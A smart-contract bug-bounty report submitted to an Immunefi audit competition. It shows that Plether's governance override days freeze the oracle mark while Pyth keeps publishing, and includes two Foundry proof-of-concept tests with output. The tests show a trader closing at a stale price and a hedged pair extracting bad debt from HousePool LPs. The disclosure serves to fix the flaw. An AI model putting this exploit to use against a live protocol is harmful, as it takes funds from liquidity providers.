# \#100105 [SC-Medium] override days let traders close at stale marks while live prices move

**Submitted on Nov 16th 2026 at 08:23:39 UTC by @krikolkk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100105
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Governance can configure a FAD override day, during which closes use the last Engine mark and the router relaxes live-price ordering checks. However, the override freezes pricing for the whole UTC day even while Pyth publishes, letting a trader close selectively at a stale mark after an adverse move and pass the excess loss to LPs.

## Vulnerability Details

A normal close uses a Pyth price published after the trader commits, with same-block and MEV-boundary checks protecting execution ordering. A configured override instead makes `MarketCalendarLib.marketStatus` mark the oracle frozen for the entire UTC day; the frozen path reuses `engine.lastMarkPrice()` subject only to an age check. For closes, it applies no adverse live-price shift, and the router skips those ordering checks. [Override calendar logic](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarketCalendarLib.sol#L30-L58).

The override does not check whether Pyth is publishing or end at the FX session reopen. Thus the mark can remain fixed while the live price moves. Liquidation decisions use the same frozen mark, and take-profit and stop-loss triggers are rejected during the freeze.

Governance schedules an override day through the timelocked calendar configuration, making the date public in advance. A trader with a position open before the day can watch Pyth and commit a full close when the live price moves adversely by more than the 50 bps frozen spread; a keeper can execute it with an empty update payload. This requires Pyth to publish during the override and a sufficient adverse move. The trader can wait for live pricing to resume when the move is favorable.

For example, a 100,000-unit LONG has 80,000 USDG notional at 0.80. If Pyth publishes 0.816, a live-priced close loses 1,600 USDG, while the frozen close pays the 400 USDG spread. Against the live-priced close, the trader gains 1,200.64 USDG including the lower execution fee, and the pool loses 1,200 USDG. The PoC confirms these values.

Consider aligning the override freeze to actual feed closures, or keeping live-price and execution-ordering protections active whenever Pyth is publishing.

## Impact Details

HousePool LPs lose the live-price loss beyond the 50 bps spread when traders close on an adverse move; junior assets are affected first, then senior assets through the pool waterfall. The loss is bounded by adverse-side open interest and the price move, is permanent once settled, and can recur on each configured override day. On 80,000 USDG notional, a 2% move costs LPs 1,200 USDG. The trader receives the corresponding gain relative to a live-priced close, plus the execution-fee difference; the route is profitable only when the adverse move exceeds the spread.

Positions that become unhealthy at the live price can remain unliquidated until the override ends, allowing deficits to grow. The amount depends on open interest and the price move; at a 4% move the pool can be worse off than after a live-priced liquidation. Any settled deficit is permanent.

Take-profit and stop-loss triggers are rejected for the duration of the override, preventing affected traders from executing those exits during that period.

## References

1. [`MarketCalendarLib.marketStatus`](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarketCalendarLib.sol#L30-L58)
2. [`PletherOracle._frozenBasket` and `_orderExecutionPrice`](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743) ([close pricing](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L925-L941)); [`OrderRouterExecutionSidecar._executePrepared`](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L434-L452)
3. [`CfdEngineAdmin.proposeCalendarConfig`](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineAdmin.sol#L155-L166)
4. [Pyth FX market hours](https://docs.pyth.network/pro/market-hours)


## Proof of Concept

## Proof of Concept

Both tests below build on test helpers that ship with the public repository at the audited commit: [`BasePerpTest`](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/BasePerpTest.sol), [`MockSettlementToken`](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/utils/MockSettlementToken.sol) and [`MockPyth`](https://github.com/Plether-Fi/plether-core/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/shared/test-support/MockPyth.sol). Nothing else is needed. Run everything from `packages/perps`.

The first test covers the stale-mark close. Save it as `test/poc/PoC/PoC.t.sol` and run it with `FOUNDRY_TEST=test/poc/PoC FOUNDRY_DISABLE_NIGHTLY_WARNING=1 forge test --match-path "test/poc/PoC/*.t.sol" -vv`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {MockSettlementToken} from "../../utils/MockSettlementToken.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// Governance-configured FAD override day freezes the oracle for the entire UTC day, while Pyth FX keeps publishing
/// (Pyth FX trades through most US holidays, and in any case reopens at 17:00 New York, i.e. 21:00/22:00 UTC, before
/// the UTC day ends). A trader watches live Pyth and closes at the stale pre-day Engine mark only when the live price
/// has moved against them by more than the 50 bps frozen spread.
contract OverrideDayFrozenCloseAtStaleMarkPoC is BasePerpTest {

    MockPyth mockPyth;
    bytes32 constant FEED_A = bytes32(uint256(1));
    bytes32 constant FEED_B = bytes32(uint256(2));
    address alice = address(0x111);
    address bob = address(0x222);
    address keeper = address(0x333);
    bytes32[] feedIds;
    uint256[] weights;
    uint256[] bases;

    // Monday 2026-03-09 12:00 UTC
    uint256 constant MONDAY_NOON = 1_773_057_600;
    // Wednesday 2026-03-11 00:00 UTC (override day D)
    uint256 constant D_START = 1_773_187_200;
    int64 constant P0 = 80_000_000; // 0.80
    uint256 constant SIZE = 100_000 * 1e18; // notional 80,000 USDG at 0.80
    uint256 constant MARGIN = 10_000 * 1e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        settlementToken = new MockSettlementToken();
        mockPyth = new MockPyth();
        mockPyth.setSynchronizeLegacyUniquePrices(true);
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(engine.CAP_PRICE()))));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));
        feedIds.push(FEED_A);
        feedIds.push(FEED_B);
        weights.push(0.5e18);
        weights.push(0.5e18);
        bases.push(1e8);
        bases.push(1e8);
        engineLens = new CfdEngineLens(address(engine));
        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(mockPyth), feedIds, weights, bases, new bool[](2)
        );
        router = _deployLegacyOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));
        _bypassAllTimelocks();
        _bootstrapSeededLifecycle();
        _fundJunior(bob, 1_000_000 * 1e6);
        settlementToken.mint(alice, 20_000 * 1e6);
        vm.startPrank(alice);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(alice, 20_000 * 1e6);
        vm.deal(alice, 10 ether);
        vm.stopPrank();
        vm.deal(keeper, 10 ether);
    }

    function _payload(
        int64 price,
        uint64 tick,
        uint64 previous
    ) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(feedIds[i], MockPyth.MockPrice(price, 0, -8, tick, previous));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _empty() internal pure returns (bytes[] memory d) {
        d = new bytes[](1);
        d[0] = "";
    }

    struct Out {
        uint256 trader;
        uint256 pool;
        uint256 execMark;
        bool frozenAtExec;
    }

    /// Full ordering. `overrideD`: governance flagged day D as an override day (attack); otherwise the same
    /// calendar change is made for a far-away day so both branches share the identical timeline (control).
    /// `pLive`: what Pyth publishes during D. `closeSecondOfDay`: when the trader commits the close on D.
    function _run(
        bool overrideD,
        int64 pLive,
        uint256 closeSecondOfDay,
        CfdTypes.Side side
    ) internal returns (Out memory o) {
        // 0. Governance calendar (timelocked) - same warp in both branches.
        ICfdEngineAdminHost.EngineCalendarConfig memory cfg = _engineCalendarConfig();
        cfg.fadDayTimestamps = new uint256[](1);
        cfg.fadDayTimestamps[0] = overrideD ? D_START + 12 hours : D_START + 70 days;
        _setCalendarConfig(cfg);

        // 1. Monday: trader opens a position at 0.80 (live).
        vm.warp(MONDAY_NOON);
        mockPyth.setAllPrices(feedIds, P0, int32(-8), MONDAY_NOON + 6);
        vm.prank(alice);
        router.commitOrder(side, SIZE, MARGIN, side == CfdTypes.Side.LONG ? 0.79e8 : 0.81e8, false);
        vm.warp(MONDAY_NOON + 50);
        vm.roll(vm.getBlockNumber() + 1);
        router.executeOrder(1, _empty());
        (uint256 size,,,,,,) = engine.positions(alice);
        require(size == SIZE, "open failed");

        // 2. Final live mark before D, at the reference price P0 (Tuesday 23:59:00 UTC).
        uint256 lastLive = D_START - 60;
        vm.warp(lastLive);
        mockPyth.setAllPrices(feedIds, P0, int32(-8), lastLive);
        router.updateMarkPrice(_payload(P0, uint64(lastLive), uint64(MONDAY_NOON + 6)));

        // 3. During D Pyth publishes pLive. Trader observes it and commits a full close.
        uint256 commitTs = D_START + closeSecondOfDay;
        vm.warp(commitTs);
        mockPyth.setAllPrices(feedIds, pLive, int32(-8), commitTs + 6);
        vm.prank(alice);
        router.commitOrder(side, SIZE, 0, 0, true);

        // 4. Keeper executes 30 s later. Live: needs a tick in (commit, now] => pLive. Frozen: replays Engine mark.
        vm.warp(commitTs + 30);
        vm.roll(vm.getBlockNumber() + 1);
        o.frozenAtExec = engine.isOracleFrozen();
        vm.prank(keeper);
        router.executeOrder(2, _empty());
        (size,,,,,,) = engine.positions(alice);
        require(size == 0, "close failed");
        o.execMark = engine.lastMarkPrice();
        o.trader = clearinghouse.balanceAssets(alice) + engine.traderClaimBalanceAssets(alice);
        o.pool = settlementToken.balanceOf(address(pool));
    }

    /// ONE end-to-end scenario, run twice from the same snapshot:
    ///   control: identical timeline, no override on D  -> the close needs a live Pyth tick and fills at the live price.
    ///   attack : governance flagged D as an override day -> oracle frozen all UTC day, the close replays the stale
    ///            pre-day Engine mark (0.80) although Pyth is publishing 0.816 (+2%, adverse for a LONG).
    function test_overrideDayFreezeLetsTraderExitAtStaleMarkAtLpExpense() public {
        int64 pLive = 81_600_000; // live Pyth FX basket on D: 0.816 (+2%)
        uint256 snap = vm.snapshotState();
        Out memory ctl = _run(false, pLive, 12 hours, CfdTypes.Side.LONG);
        vm.revertToState(snap);
        Out memory atk = _run(true, pLive, 12 hours, CfdTypes.Side.LONG);

        // Independent reference values (derived from position terms, not from the buggy path's output):
        uint256 notionalAtP0 = SIZE * uint256(uint64(P0)) / 1e20; // 80,000 USDG
        uint256 priceLossAtLive = SIZE * uint256(uint64(pLive - P0)) / 1e20; // LONG loses (0.816-0.80) * 100k = 1,600 USDG
        uint256 frozenSpread = notionalAtP0 * engine.frozenCloseSpreadBps() / 10_000; // 50 bps = 400 USDG
        uint256 execFeeDelta = (priceLossAtLive * engine.executionFeeBps()) / 10_000; // 4 bps on the 1,600 notional difference
        assertEq(notionalAtP0, 80_000e6);
        assertEq(priceLossAtLive, 1_600e6);
        assertEq(frozenSpread, 400e6);

        // Regime: control is live (priced at Pyth's 0.816), attack is frozen and fills at the stale 0.80 mark.
        assertFalse(ctl.frozenAtExec, "control: oracle live");
        assertTrue(atk.frozenAtExec, "attack: oracle frozen by override day although Pyth publishes");
        assertEq(ctl.execMark, uint256(uint64(pLive)), "control fills at live Pyth price 0.816");
        assertEq(atk.execMark, uint256(uint64(P0)), "attack fills at stale pre-day mark 0.80");

        // Trader (attacker) is richer, HousePool LPs are poorer, versus closing at the live price.
        assertGt(atk.trader, ctl.trader, "trader ends with more assets than a live-priced close");
        assertLt(atk.pool, ctl.pool, "pool ends with fewer assets than a live-priced close");
        assertEq(atk.pool, ctl.pool - (priceLossAtLive - frozenSpread), "LP loss = 1,600 loss - 400 spread = 1,200 USDG");
        assertEq(
            atk.trader,
            ctl.trader + (priceLossAtLive - frozenSpread) + execFeeDelta,
            "trader gain = 1,200 USDG + 0.64 USDG lower execution fee"
        );
        assertEq(atk.trader - ctl.trader, 1_200_640_000, "trader gain 1,200.64 USDG");
        assertEq(ctl.pool - atk.pool, 1_200_000_000, "LP loss 1,200.00 USDG");

        console2.log("live Pyth price on D (1e8):", uint256(uint64(pLive)));
        console2.log("control exec mark / attack exec mark (1e8):", ctl.execMark, atk.execMark);
        console2.log("trader assets control / attack (1e6):", ctl.trader, atk.trader);
        console2.log("pool assets   control / attack (1e6):", ctl.pool, atk.pool);
        console2.log("trader gain (1e6):", atk.trader - ctl.trader);
        console2.log("LP loss     (1e6):", ctl.pool - atk.pool);
    }

}
```

```console
Ran 1 test for test/poc/PoC/PoC.t.sol:OverrideDayFrozenCloseAtStaleMarkPoC
[PASS] test_overrideDayFreezeLetsTraderExitAtStaleMarkAtLpExpense() (gas: 9002717)
Logs:
live Pyth price on D (1e8): 81600000
control exec mark / attack exec mark (1e8): 81600000 80000000
trader assets control / attack (1e6): 18333817463 19534457463
pool assets   control / attack (1e6): 1003601342537 1002401342537
trader gain (1e6): 1200640000
LP loss     (1e6): 1200000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.69ms (8.72ms CPU time)

Ran 1 test suite in 15.49ms (14.69ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The second test covers the blind liquidations. Save it next to the first as `test/poc/PoC/UnfreezeGap.t.sol`; the same command runs both files. A hedged pair opens at 0.80 on Monday: `alice` is LONG and `carol` is SHORT, each 100,000 units with 2,700 USDG margin, enough to survive the 3% FAD margin in the runway. The last live mark is 0.80 at 23:59 UTC the day before D. At 12:00 on D Pyth prints 0.82, which puts `alice` below the 1% maintenance margin at the live price. `pEnd` is the price at 00:00:10 UTC on D+1.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {MockSettlementToken} from "../../utils/MockSettlementToken.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// Override day D while Pyth FX is live: liquidations during D only see the frozen pre-day mark, so a position that
/// crosses maintenance intraday is liquidated only at the first fresh price after 00:00 UTC D+1, beyond its margin.
/// A hedged pair (LONG alice + SHORT carol, same size) turns that write-off into a direction-neutral extraction.
contract GolemC13UnfreezeGapPoC is BasePerpTest {

    MockPyth mockPyth;
    bytes32 constant FEED_A = bytes32(uint256(1));
    bytes32 constant FEED_B = bytes32(uint256(2));
    address alice = address(0x111); // LONG (loses when price rises)
    address carol = address(0x444); // SHORT (wins when price rises)
    address bob = address(0x222);
    address keeper = address(0x333);
    bytes32[] feedIds;
    uint256[] weights;
    uint256[] bases;

    uint256 constant MONDAY_NOON = 1_773_057_600; // Mon 2026-03-09 12:00 UTC
    uint256 constant D_START = 1_773_187_200; // Wed 2026-03-11 00:00 UTC
    int64 constant P0 = 80_000_000;
    uint256 constant SIZE = 100_000 * 1e18; // 80,000 USDG notional
    uint256 constant MARGIN = 2700 * 1e6; // 3.375%: survives the 3% FAD margin in the runway

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        settlementToken = new MockSettlementToken();
        mockPyth = new MockPyth();
        mockPyth.setSynchronizeLegacyUniquePrices(true);
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(engine.CAP_PRICE()))));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));
        feedIds.push(FEED_A);
        feedIds.push(FEED_B);
        weights.push(0.5e18);
        weights.push(0.5e18);
        bases.push(1e8);
        bases.push(1e8);
        engineLens = new CfdEngineLens(address(engine));
        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(mockPyth), feedIds, weights, bases, new bool[](2)
        );
        router = _deployLegacyOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));
        _bypassAllTimelocks();
        _bootstrapSeededLifecycle();
        _fundJunior(bob, 1_000_000 * 1e6);
        address[2] memory traders = [alice, carol];
        for (uint256 i; i < 2; ++i) {
            settlementToken.mint(traders[i], 2700 * 1e6 + 100 * 1e6);
            vm.startPrank(traders[i]);
            settlementToken.approve(address(clearinghouse), type(uint256).max);
            clearinghouse.deposit(traders[i], 2700 * 1e6 + 100 * 1e6);
            vm.stopPrank();
        }
        vm.deal(keeper, 10 ether);
    }

    function _payload(
        int64 price,
        uint64 tick,
        uint64 previous
    ) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(feedIds[i], MockPyth.MockPrice(price, 0, -8, tick, previous));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _empty() internal pure returns (bytes[] memory d) {
        d = new bytes[](1);
        d[0] = "";
    }

    function _value(
        address a
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + engine.traderClaimBalanceAssets(a);
    }

    struct Out {
        uint256 aliceLiqTime;
        uint256 aliceLiqMark;
        int256 aliceDelta;
        int256 carolDelta;
        int256 pairDelta;
        int256 poolDelta;
        bool intradayLiqPossible;
    }

    /// `overrideD`: D is a governance override day (attack) or a normal live day (control).
    /// Price path: P0 until 23:59 D-1; `pCross` at D 12:00 (alice below maintenance at live price);
    /// `pEnd` at D+1 00:00:10.
    function _run(
        bool overrideD,
        int64 pCross,
        int64 pEnd
    ) internal returns (Out memory o) {
        ICfdEngineAdminHost.EngineCalendarConfig memory cfg = _engineCalendarConfig();
        cfg.fadDayTimestamps = new uint256[](1);
        cfg.fadDayTimestamps[0] = overrideD ? D_START + 12 hours : D_START + 70 days;
        _setCalendarConfig(cfg);

        uint256 alice0 = _value(alice);
        uint256 carol0 = _value(carol);
        uint256 pool0 = settlementToken.balanceOf(address(pool));

        // Monday: hedged pair opens at 0.80.
        vm.warp(MONDAY_NOON);
        mockPyth.setAllPrices(feedIds, P0, int32(-8), MONDAY_NOON + 6);
        vm.prank(alice);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, MARGIN, 0.79e8, false);
        vm.prank(carol);
        router.commitOrder(CfdTypes.Side.SHORT, SIZE, MARGIN, 0.81e8, false);
        vm.warp(MONDAY_NOON + 50);
        vm.roll(vm.getBlockNumber() + 1);
        router.executeOrder(1, _empty());
        router.executeOrder(2, _empty());
        (uint256 sa,,,,,,) = engine.positions(alice);
        (uint256 sc,,,,,,) = engine.positions(carol);
        require(sa == SIZE && sc == SIZE, "open failed");

        // Last live mark at 23:59 D-1 (inside the FAD runway when D is an override); both survive FAD margin.
        uint256 lastLive = D_START - 60;
        vm.warp(lastLive);
        mockPyth.setAllPrices(feedIds, P0, int32(-8), lastLive);
        router.updateMarkPrice(_payload(P0, uint64(lastLive), uint64(MONDAY_NOON + 6)));
        vm.prank(keeper);
        try router.executeLiquidation(alice, _empty()) {} catch {}
        (sa,,,,,,) = engine.positions(alice);
        require(sa == SIZE, "alice liquidated in runway");

        // D 12:00: Pyth live at pCross. Keeper tries to liquidate alice with the fresh tick.
        uint256 noon = D_START + 12 hours;
        vm.warp(noon);
        vm.roll(vm.getBlockNumber() + 1);
        mockPyth.setAllPrices(feedIds, pCross, int32(-8), noon);
        vm.prank(keeper);
        try router.executeLiquidation(alice, _payload(pCross, uint64(noon), uint64(lastLive))) {} catch {}
        (sa,,,,,,) = engine.positions(alice);
        if (sa == 0) {
            o.intradayLiqPossible = true;
            o.aliceLiqTime = noon;
            o.aliceLiqMark = engine.lastMarkPrice();
            // hedged attacker unwinds the other leg at the same moment
            vm.prank(carol);
            uint64 cid = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
            vm.warp(noon + 20);
            vm.roll(vm.getBlockNumber() + 1);
            mockPyth.setAllPrices(feedIds, pCross, int32(-8), noon + 6);
            router.executeOrder(cid, _empty());
        } else {
            // D+1 00:00:10: first fresh price; keeper liquidates alice, carol closes.
            uint256 t = D_START + 1 days + 10;
            vm.warp(t);
            vm.roll(vm.getBlockNumber() + 1);
            require(!engine.isOracleFrozen(), "D+1 live");
            mockPyth.setAllPrices(feedIds, pEnd, int32(-8), t);
            vm.prank(keeper);
            router.executeLiquidation(alice, _payload(pEnd, uint64(t), uint64(lastLive)));
            (sa,,,,,,) = engine.positions(alice);
            require(sa == 0, "alice not liquidated at unfreeze");
            o.aliceLiqTime = t;
            o.aliceLiqMark = engine.lastMarkPrice();
            vm.prank(carol);
            uint64 cid = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
            vm.warp(t + 20);
            vm.roll(vm.getBlockNumber() + 1);
            mockPyth.setAllPrices(feedIds, pEnd, int32(-8), t + 6);
            router.executeOrder(cid, _empty());
        }
        (sc,,,,,,) = engine.positions(carol);
        require(sc == 0, "carol close failed");
        o.aliceDelta = int256(_value(alice)) - int256(alice0);
        o.carolDelta = int256(_value(carol)) - int256(carol0);
        o.pairDelta = o.aliceDelta + o.carolDelta;
        o.poolDelta = int256(settlementToken.balanceOf(address(pool))) - int256(pool0);
    }

    function _log(
        string memory tag,
        Out memory o
    ) internal pure {
        console2.log(tag);
        console2.log("  intraday liquidation possible", o.intradayLiqPossible ? 1 : 0);
        console2.log("  alice liquidated at time / mark", o.aliceLiqTime, o.aliceLiqMark);
        console2.log("  alice delta / carol delta / pair delta / pool delta (1e6):");
        console2.logInt(o.aliceDelta);
        console2.logInt(o.carolDelta);
        console2.logInt(o.pairDelta);
        console2.logInt(o.poolDelta);
    }

    function _pair(
        int64 pCross,
        int64 pEnd
    ) internal returns (Out memory ctl, Out memory atk) {
        uint256 s = vm.snapshotState();
        ctl = _run(false, pCross, pEnd);
        vm.revertToState(s);
        atk = _run(true, pCross, pEnd);
        vm.revertToState(s);
        console2.log("==== pCross / pEnd", uint256(int256(pCross)), uint256(int256(pEnd)));
        _log("CONTROL live D", ctl);
        _log("ATTACK override D", atk);
    }

    /// Basket +2.5% intraday (alice below 1% maintenance), +5% by D+1 00:00.
    function test_unfreezeGap_5pct() public {
        (Out memory ctl, Out memory atk) = _pair(82_000_000, 84_000_000);
        assertTrue(ctl.intradayLiqPossible, "control liquidates intraday");
        assertFalse(atk.intradayLiqPossible, "frozen mark hides the crossing");
        assertGt(atk.pairDelta, 0, "hedged pair extracts");
        assertLt(atk.poolDelta, ctl.poolDelta, "LP worse under override");
    }

    function test_sweep() public {
        _pair(82_000_000, 82_400_000); // +3%
        _pair(82_000_000, 83_200_000); // +4%
        _pair(82_000_000, 86_400_000); // +8%
    }

}
```

Both tests pass. In the control run, where D is a normal live day, the keeper liquidates `alice` at 0.82 at 12:00 on D and `carol` unwinds at the same time; the pair ends at -182.60 USDG (fees and penalty) and the pool at +45.40 USDG. In the attack run, the 12:00 liquidation attempt sees only the frozen 0.80 mark and fails. `alice` is liquidated at `pEnd` at 00:00:10 on D+1, losing all 2,700.20 USDG of collateral, and `carol` closes at `pEnd`:

| `pEnd` (move from 0.80) | Pair result (USDG) | Pool result (USDG) | LP loss versus control (USDG) |
|---|---|---|---|
| 0.824 (+3%) | -184.11 | +46.75 | none, no bad debt yet |
| 0.832 (+4%) | +429.61 | -567.29 | 612.69 |
| 0.840 (+5%) | +1,229.29 | -1,367.29 | 1,412.69 |
| 0.864 (+8%) | +3,628.33 | -3,767.29 | 3,812.69 |

The hedged pair carries no directional risk. It collects the losing leg's uncollectible loss once the full-day live move exceeds the FAD-margin equity, about 3.4% here. Both tests use `MockPyth`, so "Pyth publishes during D" is simulated by setting a live tick on both feeds.
